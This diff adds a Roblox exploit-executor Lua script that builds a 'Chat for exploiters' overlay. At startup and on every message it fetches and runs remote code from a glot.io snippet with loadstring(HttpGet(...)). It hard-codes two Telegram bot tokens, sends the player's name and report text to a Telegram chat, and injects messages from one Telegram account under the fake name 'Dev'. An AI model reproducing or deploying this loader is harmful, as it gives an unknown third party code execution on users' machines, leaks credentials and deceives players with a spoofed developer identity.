@@ -1,0 +1,564 @@
+local CoreGui = game:GetService("CoreGui")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer:FindFirstChild("PlayerGui")
+
+local existingGui =
+    CoreGui:FindFirstChild("ConsoleMessagesGUI")
+    or (PlayerGui and PlayerGui:FindFirstChild("ConsoleMessagesGUI"))
+
+if existingGui then
+    return
+end
+local CoreGui = game:GetService("CoreGui") or game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+
+local TELEGRAM_TOKEN = "7549387448:AAGMAP-M_Dfeck_cM_KZWLPPQENwx_NFzl0"
+local CHAT_ID = "7554045989"
+
+local consoleGui = Instance.new("ScreenGui")
+consoleGui.Name = "ConsoleMessagesGUI"
+consoleGui.Parent = CoreGui
+
+local TopBarApp = CoreGui:WaitForChild("TopBarApp"):WaitForChild("TopBarApp")
+local UnibarLeftFrame = TopBarApp:WaitForChild("UnibarLeftFrame")
+local UnibarMenu = UnibarLeftFrame:WaitForChild("UnibarMenu")
+local sausageHolder = UnibarMenu:WaitForChild("2")
+local originalSize = sausageHolder.Size.X.Offset
+
+local chatButton = Instance.new("TextButton")
+chatButton.Text = "O"
+chatButton.Font = Enum.Font.Code
+chatButton.TextSize = 20
+chatButton.TextColor3 = Color3.new(1, 1, 1)
+chatButton.Size = UDim2.new(0, 48, 0, 48)
+chatButton.AnchorPoint = Vector2.new(0.5, 0.5)
+chatButton.Position = UDim2.new(0, originalSize + 18, 0.5, 0)
+chatButton.BackgroundTransparency = 1
+chatButton.Parent = sausageHolder
+
+local badge = Instance.new("TextLabel")
+badge.Name = "Badge"
+badge.Parent = chatButton
+badge.Size = UDim2.new(0, 18, 0, 18)
+badge.Position = UDim2.new(0.7, 0, 0.1, 0)
+badge.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+badge.TextColor3 = Color3.new(1, 1, 1)
+badge.TextSize = 12
+badge.Font = Enum.Font.SourceSansBold
+badge.Visible = false
+local badgeCorner = Instance.new("UICorner")
+badgeCorner.CornerRadius = UDim.new(1, 0)
+badgeCorner.Parent = badge
+
+sausageHolder.Size = UDim2.new(0, originalSize + 48, 0, sausageHolder.Size.Y.Offset)
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Parent = consoleGui
+mainFrame.Size = UDim2.new(0, 450, 0, 300)
+mainFrame.Position = UDim2.new(0.5, -210, 0, 10)
+mainFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+mainFrame.BackgroundTransparency = 0.5
+mainFrame.BorderSizePixel = 0
+
+local corner = Instance.new("UICorner")
+corner.Parent = mainFrame
+corner.CornerRadius = UDim.new(0.05, 0)
+
+local activeUsersFrame = Instance.new("Frame")
+activeUsersFrame.Name = "ActiveUsersFrame"
+activeUsersFrame.Parent = mainFrame
+activeUsersFrame.Size = UDim2.new(0, 140, 1, 0)
+activeUsersFrame.Position = UDim2.new(1, 5, 0, 0)
+activeUsersFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+activeUsersFrame.BackgroundTransparency = 0.5
+activeUsersFrame.BorderSizePixel = 0
+
+local auCorner = Instance.new("UICorner")
+auCorner.Parent = activeUsersFrame
+auCorner.CornerRadius = UDim.new(0.05, 0)
+
+local auTitle = Instance.new("TextLabel")
+auTitle.Parent = activeUsersFrame
+auTitle.Size = UDim2.new(1, 0, 0, 30)
+auTitle.BackgroundColor3 = Color3.new(0, 0, 0)
+auTitle.BackgroundTransparency = 0.7
+auTitle.TextColor3 = Color3.new(1, 1, 1)
+auTitle.Text = "Script Users"
+auTitle.Font = Enum.Font.SourceSansBold
+auTitle.TextSize = 14
+local autCorner = Instance.new("UICorner")
+autCorner.Parent = auTitle
+autCorner.CornerRadius = UDim.new(0.5, 0)
+
+local auScroll = Instance.new("ScrollingFrame")
+auScroll.Parent = activeUsersFrame
+auScroll.Size = UDim2.new(1, -10, 1, -40)
+auScroll.Position = UDim2.new(0, 5, 0, 35)
+auScroll.BackgroundTransparency = 1
+auScroll.ScrollBarThickness = 2
+auScroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
+
+local auLayout = Instance.new("UIListLayout")
+auLayout.Parent = auScroll
+auLayout.Padding = UDim.new(0, 5)
+
+local activeList = {}
+local function updateActiveList(name)
+    if activeList[name] then return end
+    activeList[name] = true
+    
+    local userRow = Instance.new("Frame")
+    userRow.Name = name
+    userRow.Size = UDim2.new(1, 0, 0, 30)
+    userRow.BackgroundTransparency = 0.8
+    userRow.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+    userRow.Parent = auScroll
+    local urCorner = Instance.new("UICorner")
+    urCorner.CornerRadius = UDim.new(0.2, 0)
+    urCorner.Parent = userRow
+
+    local img = Instance.new("ImageLabel")
+    img.Size = UDim2.new(0, 24, 0, 24)
+    img.Position = UDim2.new(0, 3, 0.5, -12)
+    img.BackgroundTransparency = 1
+    img.Parent = userRow
+    local imgCorner = Instance.new("UICorner")
+    imgCorner.CornerRadius = UDim.new(1, 0)
+    imgCorner.Parent = img
+
+    local nameLabel = Instance.new("TextLabel")
+    nameLabel.Size = UDim2.new(1, -30, 1, 0)
+    nameLabel.Position = UDim2.new(0, 30, 0, 0)
+    nameLabel.BackgroundTransparency = 1
+    nameLabel.Text = name
+    nameLabel.TextColor3 = Color3.new(1, 1, 1)
+    nameLabel.Font = Enum.Font.SourceSans
+    nameLabel.TextSize = 10
+    nameLabel.TextXAlignment = Enum.TextXAlignment.Left
+    nameLabel.Parent = userRow
+
+    spawn(function()
+        pcall(function()
+            local userId = Players:GetUserIdFromNameAsync(name)
+            img.Image = Players:GetUserThumbnailAsync(userId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
+        end)
+    end)
+end
+
+local title = Instance.new("TextLabel")
+title.Parent = mainFrame
+title.Size = UDim2.new(1, 0, 0, 30)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.BackgroundColor3 = Color3.new(0, 0, 0)
+title.BackgroundTransparency = 0.7
+title.TextColor3 = Color3.new(1, 1, 1)
+title.Text = "Chat for exploiters"
+title.Font = Enum.Font.SourceSansBold
+title.TextSize = 16
+title.TextXAlignment = Enum.TextXAlignment.Center
+local cornerTitle = Instance.new("UICorner")
+cornerTitle.Parent = title
+cornerTitle.CornerRadius = UDim.new(0.5, 0)
+
+local closeButton = Instance.new("TextButton")
+closeButton.Parent = title
+closeButton.Size = UDim2.new(0, 20, 0, 20)
+closeButton.Position = UDim2.new(1, -30, 0.5, -10)
+closeButton.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+closeButton.BackgroundTransparency = 0.7
+closeButton.TextColor3 = Color3.new(1, 1, 1)
+closeButton.Text = "X"
+closeButton.Font = Enum.Font.SourceSansBold
+closeButton.TextSize = 14
+
+closeButton.MouseButton1Click:Connect(function()
+    consoleGui.Enabled = not consoleGui.Enabled
+end)
+
+local chatBackground = Instance.new("Frame")
+chatBackground.Parent = mainFrame
+chatBackground.Size = UDim2.new(1, 0, 0.615, 0)
+chatBackground.Position = UDim2.new(0, 0, 0, 30)
+chatBackground.BackgroundColor3 = Color3.new(0, 0, 0)
+chatBackground.BackgroundTransparency = 0.8
+chatBackground.BorderSizePixel = 0
+
+local messagesContainer = Instance.new("ScrollingFrame")
+messagesContainer.Parent = chatBackground
+messagesContainer.Size = UDim2.new(1, -10, 1, -10)
+messagesContainer.Position = UDim2.new(0, 5, 0, 5)
+messagesContainer.BackgroundTransparency = 1
+messagesContainer.ScrollBarThickness = 4
+messagesContainer.ScrollBarImageColor3 = Color3.new(0.5, 0.5, 0.5)
+messagesContainer.AutomaticCanvasSize = Enum.AutomaticSize.Y
+messagesContainer.CanvasSize = UDim2.new(0, 0, 0, 0)
+messagesContainer.ScrollingDirection = Enum.ScrollingDirection.Y
+
+local listLayout = Instance.new("UIListLayout")
+listLayout.Parent = messagesContainer
+listLayout.Padding = UDim.new(0, 5)
+listLayout.SortOrder = Enum.SortOrder.LayoutOrder
+
+local inputFrame = Instance.new("Frame")
+inputFrame.Parent = mainFrame
+inputAreaSize = UDim2.new(1, 0, 0.285, 0)
+inputFrame.Size = inputAreaSize
+inputFrame.Position = UDim2.new(0, 0, 0.715, 0)
+inputFrame.BackgroundColor3 = Color3.new(0, 0, 0)
+inputFrame.BackgroundTransparency = 0.6
+inputFrame.BorderSizePixel = 0
+
+local inputBackground = Instance.new("Frame")
+inputBackground.Parent = inputFrame
+inputBackground.Size = UDim2.new(1, -10, 0.6, 0)
+inputBackground.Position = UDim2.new(0, 5, 0.05, 0)
+inputBackground.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
+inputBackground.BackgroundTransparency = 0.7
+local inputCorner = Instance.new("UICorner")
+inputCorner.Parent = inputBackground
+inputCorner.CornerRadius = UDim.new(0.1, 0)
+
+local textBox = Instance.new("TextBox")
+textBox.Parent = inputBackground
+textBox.Size = UDim2.new(1, -10, 1, -10)
+textBox.Position = UDim2.new(0, 5, 0, 5)
+textBox.BackgroundTransparency = 1
+textBox.TextColor3 = Color3.new(1, 1, 1)
+textBox.PlaceholderText = "enter text ..."
+textBox.Text = ""
+textBox.ClearTextOnFocus = false
+textBox.TextWrapped = true
+textBox.TextXAlignment = Enum.TextXAlignment.Left
+textBox.TextYAlignment = Enum.TextYAlignment.Top
+textBox.MultiLine = true
+textBox.Font = Enum.Font.SourceSans
+textBox.TextSize = 14
+
+local sendButton = Instance.new("TextButton")
+sendButton.Parent = inputFrame
+sendButton.Size = UDim2.new(0.45, 0, 0.25, 0)
+sendButton.Position = UDim2.new(0.025, 0, 0.7, 0)
+sendButton.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+sendButton.BackgroundTransparency = 0.7
+sendButton.TextColor3 = Color3.new(1, 1, 1)
+sendButton.Text = "Send"
+sendButton.Font = Enum.Font.SourceSans
+sendButton.TextSize = 14
+
+local reportButton = Instance.new("TextButton")
+reportButton.Parent = inputFrame
+reportButton.Size = UDim2.new(0.45, 0, 0.25, 0)
+reportButton.Position = UDim2.new(0.525, 0, 0.7, 0)
+reportButton.BackgroundColor3 = Color3.new(0.3, 0, 0)
+reportButton.BackgroundTransparency = 0.5
+reportButton.TextColor3 = Color3.new(1, 1, 1)
+reportButton.Text = "Report"
+reportButton.Font = Enum.Font.SourceSans
+reportButton.TextSize = 14
+
+local reportHighlight = Instance.new("UIGradient")
+reportHighlight.Color = ColorSequence.new(Color3.fromRGB(255, 255, 255))
+reportHighlight.Transparency = NumberSequence.new{
+    NumberSequenceKeypoint.new(0, 0.8),
+    NumberSequenceKeypoint.new(0.5, 0.3),
+    NumberSequenceKeypoint.new(1, 0.8)
+}
+reportHighlight.Rotation = 0
+reportHighlight.Parent = reportButton
+
+local reportTween = game:GetService("TweenService"):Create(reportHighlight, TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1, true), {Rotation = 360})
+reportTween:Play()
+
+local function sendTelegramMessage(message)
+    local data = {
+        chat_id = CHAT_ID,
+        text = "📢 [REPORT SYSTEM]\n👤 From: " .. Players.LocalPlayer.Name .. "\n📄 Content: " .. message
+    }
+    local requestFunction = http_request or syn.request or request
+    if requestFunction then
+        requestFunction({
+            Url = "https://api.telegram.org/bot"..TELEGRAM_TOKEN.."/sendMessage",
+            Method = "POST",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = HttpService:JSONEncode(data)
+        })
+    end
+end
+
+reportButton.MouseButton1Click:Connect(function()
+    if textBox.Text ~= "" then
+        sendTelegramMessage(textBox.Text)
+        addMessage("[SYSTEM]: تم إرسال البلاغ بنجاح!")
+        textBox.Text = ""
+    else
+        addMessage("[SYSTEM]: اكتب سبب البلاغ في المربع أولاً!")
+    end
+end)
+
+local clearButton = Instance.new("TextButton")
+clearButton.Parent = title
+clearButton.Size = UDim2.new(0, 80, 0, 20)
+clearButton.Position = UDim2.new(0, 10, 0.5, -10)
+clearButton.BackgroundColor3 = Color3.new(0.3, 0.3, 0.3)
+clearButton.BackgroundTransparency = 0.7
+clearButton.TextColor3 = Color3.new(1, 1, 1)
+clearButton.Text = "Clear"
+clearButton.Font = Enum.Font.SourceSans
+clearButton.TextSize = 12
+
+local BannedWords = {"حمار", "كلب", "غبي", "تفو", "واطي", "منيك", "شرموط", "خنزير", "سافل", "خرا", "زبل", "حقير", "كس", "زب", "قحبة", "عاهرة", "fuck", "shit", "bitch", "slut", "منيوك", "كسمك", "ابن حرام"}
+
+local function applyFilter(text)
+    local result = text
+    for _, word in ipairs(BannedWords) do
+        local replacement = string.rep("#", utf8.len(word) or #word)
+        result = result:gsub(word, replacement)
+    end
+    return result
+end
+
+local messages = {}
+local messageCount = 0
+local unreadCount = 0
+local lastMessageTime = {}
+local uniqueSenders = {}
+
+local base64chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"
+
+local function base64encode(data)
+    local bytes = {}
+    for i = 1, #data do table.insert(bytes, string.byte(data, i)) end
+    local result = ""
+    for i = 1, #bytes, 3 do
+        local b1, b2, b3 = bytes[i], bytes[i+1], bytes[i+2]
+        local n = (b1 or 0) * 0x10000 + (b2 or 0) * 0x100 + (b3 or 0)
+        result = result .. string.sub(base64chars, math.floor(n / 0x40000) % 64 + 1, math.floor(n / 0x40000) % 64 + 1)
+        result = result .. string.sub(base64chars, math.floor(n / 0x1000) % 64 + 1, math.floor(n / 0x1000) % 64 + 1)
+        result = result .. (b2 and string.sub(base64chars, math.floor(n / 0x40) % 64 + 1, math.floor(n / 0x40) % 64 + 1) or "=")
+        result = result .. (b3 and string.sub(base64chars, n % 64 + 1, n % 64 + 1) or "=")
+    end
+    return result
+end
+
+local function base64decode(data)
+    data = string.gsub(data, "[^%w%+/=]", "")
+    local result = ""
+    for i = 1, #data, 4 do
+        local s1 = (string.find(base64chars, string.sub(data, i, i)) or 1) - 1
+        local s2 = (string.find(base64chars, string.sub(data, i+1, i+1)) or 1) - 1
+        local s3 = (string.find(base64chars, string.sub(data, i+2, i+2)) or 1) - 1
+        local s4 = (string.find(base64chars, string.sub(data, i+3, i+3)) or 1) - 1
+        local n = s1 * 0x40000 + s2 * 0x1000 + s3 * 0x40 + s4
+        result = result .. string.char(math.floor(n / 0x10000) % 256)
+        if string.sub(data, i+2, i+2) ~= "=" then result = result .. string.char(math.floor(n / 0x100) % 256) end
+        if string.sub(data, i+3, i+3) ~= "=" then result = result .. string.char(n % 256) end
+    end
+    return result
+end
+
+local function updateBadge()
+    if unreadCount > 0 and not consoleGui.Enabled then
+        badge.Visible = true
+        badge.Text = tostring(unreadCount)
+        chatButton.TextColor3 = Color3.new(1, 0, 0)
+    else
+        badge.Visible = false
+        unreadCount = 0
+        chatButton.TextColor3 = Color3.new(1, 1, 1)
+    end
+end
+
+function addMessage(fullText)
+    if not fullText or fullText == "" then return end
+
+    if fullText:find("SYSTEM_PING_ON") then
+        local sender = fullText:match("^(.-):")
+        if sender then updateActiveList(sender) end
+        return
+    end
+
+    fullText = applyFilter(fullText)
+    local senderName = fullText:match("^(.-):")
+    if senderName then updateActiveList(senderName) end 
+
+    local currentTime = os.time()
+    if lastMessageTime[fullText] and currentTime - lastMessageTime[fullText] <= 0.5 then return end
+    lastMessageTime[fullText] = currentTime
+    messageCount = messageCount + 1
+
+    local messageFrame = Instance.new("Frame")
+    messageFrame.Parent = messagesContainer
+    messageFrame.Size = UDim2.new(1, 0, 0, 0)
+    messageFrame.AutomaticSize = Enum.AutomaticSize.Y
+    messageFrame.BackgroundTransparency = 1
+    messageFrame.LayoutOrder = messageCount
+
+    if senderName then
+        uniqueSenders[senderName] = true
+        local img = Instance.new("ImageLabel")
+        img.Size = UDim2.new(0, 20, 0, 20)
+        img.Position = UDim2.new(0, 0, 0, 0)
+        img.BackgroundTransparency = 1
+        img.Parent = messageFrame
+        local uic = Instance.new("UICorner")
+        uic.CornerRadius = UDim.new(1,0)
+        uic.Parent = img
+        
+        spawn(function()
+            pcall(function()
+                local userId = Players:GetUserIdFromNameAsync(senderName)
+                img.Image = Players:GetUserThumbnailAsync(userId, Enum.ThumbnailType.HeadShot, Enum.ThumbnailSize.Size48x48)
+            end)
+        end)
+    end
+
+    local textLabel = Instance.new("TextLabel")
+    textLabel.Parent = messageFrame
+    textLabel.Size = UDim2.new(1, -25, 0, 0)
+    textLabel.Position = UDim2.new(0, 25, 0, 0)
+    textLabel.AutomaticSize = Enum.AutomaticSize.Y
+    textLabel.BackgroundTransparency = 1
+    textLabel.TextColor3 = Color3.new(0, 162, 255)
+    textLabel.Text = fullText
+    textLabel.Font = Enum.Font.SourceSans
+    textLabel.TextSize = 14
+    textLabel.TextWrapped = true
+    textLabel.TextXAlignment = Enum.TextXAlignment.Left
+    textLabel.RichText = true
+
+    table.insert(messages, {frame = messageFrame, text = fullText, time = currentTime})
+    
+    local sCount = 0
+    for _ in pairs(uniqueSenders) do sCount = sCount + 1 end
+    title.Text = "Chat for exploiters | Active: " .. sCount
+
+    if not consoleGui.Enabled then
+        unreadCount = unreadCount + 1
+        updateBadge()
+    end
+
+    task.wait(0.05)
+    messagesContainer.CanvasPosition = Vector2.new(0, messagesContainer.AbsoluteCanvasSize.Y)
+end
+
+local function parseConsoleMessage(messageText)
+    local startPos = messageText:find("active://")
+    if not startPos then return end
+    local extractedText = messageText:sub(startPos + 9):gsub("^[%n%r%t%s]+", "")
+    local stackPositions = {extractedText:find("\n%s*Stack Begin"), extractedText:find("\n%s*Script '"), extractedText:find("\n%s*Stack End")}
+    local cutPosition = nil
+    for _, pos in ipairs(stackPositions) do if pos and (not cutPosition or pos < cutPosition) then cutPosition = pos end end
+    if cutPosition then extractedText = extractedText:sub(1, cutPosition - 1) end
+    extractedText = extractedText:gsub("[%n%r%t%s]+$", ""):gsub("[,%.]+$", "")
+    
+    if extractedText and #extractedText >= 2 then
+        local success, decoded = pcall(function() return base64decode(extractedText) end)
+        if success and decoded and #decoded > 0 then addMessage(decoded) else addMessage(extractedText) end
+    end
+end
+
+local console = game:GetService("LogService")
+console.MessageOut:Connect(function(message) parseConsoleMessage(message) end)
+
+clearButton.MouseButton1Click:Connect(function()
+    for _, msg in ipairs(messages) do if msg.frame then msg.frame:Destroy() end end
+    messages = {}; messageCount = 0; lastMessageTime = {}; uniqueSenders = {}
+    title.Text = "Chat for exploiters | Active: 0"
+end)
+
+sendButton.MouseButton1Click:Connect(function()
+    local cleanText = textBox.Text:gsub("%s+", "")
+    if cleanText ~= "" then
+        local filteredText = applyFilter(textBox.Text)
+        local playerName = Players.LocalPlayer.Name
+        local processedText = (playerName .. ": " .. filteredText):gsub("\\n", "\n")
+        local encodedText = base64encode(processedText)
+        _G.text = encodedText
+        loadstring(game:HttpGet("https://glot.io/snippets/h8smvroz9f/raw/consys.lua"))()
+        textBox.Text = ""
+    else
+        addMessage("[SYSTEM]: لا يمكنك إرسال رسالة فارغة!")
+        textBox.Text = ""
+    end
+end)
+
+mainFrame.Active = true; mainFrame.Draggable = true
+
+local highlight = Instance.new("UIGradient")
+highlight.Color = ColorSequence.new({ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.5, Color3.fromRGB(180, 180, 255)), ColorSequenceKeypoint.new(1, Color3.fromRGB(255, 255, 255))})
+highlight.Parent = mainFrame
+local tween = game:GetService("TweenService"):Create(highlight, TweenInfo.new(1, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1, true), {Rotation = 360})
+tween:Play()
+
+local function shish()
+    consoleGui.Enabled = not consoleGui.Enabled
+    chatButton.Text = consoleGui.Enabled and "C" or "O"
+    if consoleGui.Enabled then 
+        unreadCount = 0
+        updateBadge()
+    end
+end
+
+chatButton.MouseButton1Click:Connect(shish)
+
+game:GetService("RunService").RenderStepped:Connect(function()
+    if sausageHolder.Size.X.Offset ~= originalSize + 48 then
+        sausageHolder.Size = UDim2.new(0, originalSize + 48, 0, sausageHolder.Size.Y.Offset)
+    end
+end)
+
+spawn(function()
+    task.wait(2)
+    local ping = base64encode(Players.LocalPlayer.Name .. ": SYSTEM_PING_ON")
+    _G.text = ping
+    loadstring(game:HttpGet("https://glot.io/snippets/h8smvroz9f/raw/consys.lua"))()
+end)
+
+updateActiveList(Players.LocalPlayer.Name)
+shish(); updateBadge()
+
+local TELEGRAM_BOT_TOKEN = "8441598139:AAGXaLtLu_r6QRWV4RkpgRcVqITzjAmtx2Y"
+local TARGET_USER_ID = 7554045989
+local TRIGGER_NAME = game:GetService("Players").LocalPlayer.Name
+local FAKE_NAME = "Dev"
+
+local lastUpdateId = 0
+local request = http_request or syn.request or request
+
+local function pollTelegram()
+    while true do
+        local res = request({
+            Url = "https://api.telegram.org/bot"..TELEGRAM_BOT_TOKEN.."/getUpdates?timeout=30&offset="..(lastUpdateId + 1),
+            Method = "GET"
+        })
+
+        if res and res.Body then
+            local data = game:GetService("HttpService"):JSONDecode(res.Body)
+            if data.ok then
+                for _, update in ipairs(data.result) do
+                    lastUpdateId = update.update_id
+
+                    if update.message
+                        and update.message.from
+                        and update.message.from.id == TARGET_USER_ID
+                        and update.message.text
+                    then
+                        local text = update.message.text
+                        if text:sub(1, #TRIGGER_NAME) == TRIGGER_NAME then
+                            local msg = text:sub(#TRIGGER_NAME + 2)
+                            if msg and msg ~= "" then
+                                addMessage(FAKE_NAME .. ": " .. msg)
+                            end
+                        end
+                    end
+                end
+            end
+        end
+
+        task.wait(0.1)
+    end
+end
+
+task.spawn(pollTelegram)
